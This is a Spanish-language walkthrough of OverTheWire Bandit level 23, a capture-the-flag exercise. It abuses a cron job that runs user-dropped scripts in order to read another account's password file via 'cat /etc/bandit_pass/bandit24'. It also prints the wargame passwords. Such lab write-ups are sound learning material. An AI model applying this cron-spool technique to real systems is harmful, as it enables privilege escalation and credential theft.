## Objetivo:
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de acceso al nivel:
- **Host: bandit.labs.overthewire.org** 
- **Port:** 2220
- **User:** bandit23
- **Password:** QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

## Solución:
Revisamos el script `cronjob_bandit24.sh` que se encuentra en `/usr/bin/`:

```bash
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:/etc/cron.d$
```

Lo que hace este script es ejecutar todo lo que contiene el directorio `/var/spool/bandit24/foo` y que el dueño sea `bandit23`, y luego lo elimina.
**NOTA:** este script se ejecuta cada minuto mediante el crontab configurado.

Por lo tanto, como sabemos que las contraseñas de los retos se almacenan en `/etc/bandit_pass`, vamos a hacer generar un script que lea la password, y que ese contenido lo almacene en un nuevo archivo que podamos leer.

Lo primero que haremos es crear un directorio en la carpeta `/tmp`:

```bash
bandit23@bandit:/etc/cron.d$ mkdir /tmp/tmpPass
bandit23@bandit:/etc/cron.d$
```

Creamos nuestro script usando el editor de texto nano  en el directorio que creamos en `/tmp`:

```bash
bandit23@bandit:/tmp/tmpPass$ nano getPass.sh
```

El script que vamos a ejecutar es un script en bash (por eso indicamos que utilizará `#!/bin/bash`, en caso de que no se encuentre en esa ruta, se puede obtener con el comando `which bash`).

Lo que hace este script es que leerá el archivo con la password de `bandit24` y la almacenará en el archivo `password`:

```bash
#!/bin/bash

cat /etc/bandit_pass/bandit24 >> /tmp/tmpPass/password
```

Le damos permisos de ejecución al script:

```bash
bandit23@bandit:/tmp/tmpPass$ ls -la
total 76
drwxrwxr-x    2 bandit23 bandit23  4096 Feb 23 23:41 .
drwxrwx-wt 1772 root     root     69632 Feb 23 23:41 ..
-rw-rw-r--    1 bandit23 bandit23    68 Feb 23 23:41 getPass.sh
bandit23@bandit:/tmp/tmpPass$ chmod 777 getPass.sh
bandit23@bandit:/tmp/tmpPass$ ls -la
total 76
drwxrwxr-x    2 bandit23 bandit23  4096 Feb 23 23:41 .
drwxrwx-wt 1772 root     root     69632 Feb 23 23:42 ..
-rwxrwxrwx    1 bandit23 bandit23    68 Feb 23 23:41 getPass.sh
bandit23@bandit:/tmp/tmpPass$
```

Dado que la salida del script se guardará en un archivo llamado `password`, creemos también un archivo con ese nombre.

```bash
bandit23@bandit:/tmp/tmpPass$ touch password
bandit23@bandit:/tmp/tmpPass$ ls
getPass.sh  password
bandit23@bandit:/tmp/tmpPass$
```

Le damos permiso al archivo de password para que todos puedan escribir sobre el:

```bash
bandit23@bandit:/tmp/tmpPass$ ls -la password
-rw-rw-r-- 1 bandit23 bandit23 0 Feb 23 23:43 password
bandit23@bandit:/tmp/tmpPass$ chmod 666 password
bandit23@bandit:/tmp/tmpPass$ ls -la password
-rw-rw-rw- 1 bandit23 bandit23 0 Feb 23 23:43 password
bandit23@bandit:/tmp/tmpPass$ 
```

Finalmente, copiemos el script en la carpeta `/var/spool/bandit24/foo` desde donde el trabajo `cron` debería ejecutar nuestro archivo, después de un minuto revisamos que en el archivo password se han escribido datos (la password del nivel 24 se ha escrito en el archivo).

```bash
bandit23@bandit:/tmp/tmpPass$ cp getPass.sh /var/spool/bandit24/foo/
bandit23@bandit:/tmp/tmpPass$ ls -la password
-rw-rw-rw- 1 bandit23 bandit23 0 Feb 23 23:43 password
bandit23@bandit:/tmp/tmpPass$ date
Thu Feb 23 11:46:25 PM UTC 2023
bandit23@bandit:/tmp/tmpPass$ date
Thu Feb 23 11:47:53 PM UTC 2023
bandit23@bandit:/tmp/tmpPass$ ls -la password
-rw-rw-rw- 1 bandit23 bandit23 33 Feb 23 23:47 password
bandit23@bandit:/tmp/tmpPass$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/tmpPass$
```

## Notas adicionales:
| Comando | Descripción |
| --- | --- |
| touch | El comando touch de Linux se usa principalmente para crear archivos vacíos y cambiar marcas de tiempo de archivos o carpetas. |
| chmod | El comando CHMOD son utilizamos para gestionar los permisos de archivos y directorios dentro del sistema. |

## Referencias:
- https://dinahosting.com/ayuda/como-configurar-tareas-cron-de-forma-manual/
- https://medium.com/@lizparody/escribiendo-tu-primer-script-en-la-l%C3%ADnea-de-comandos-bash-971b2377c319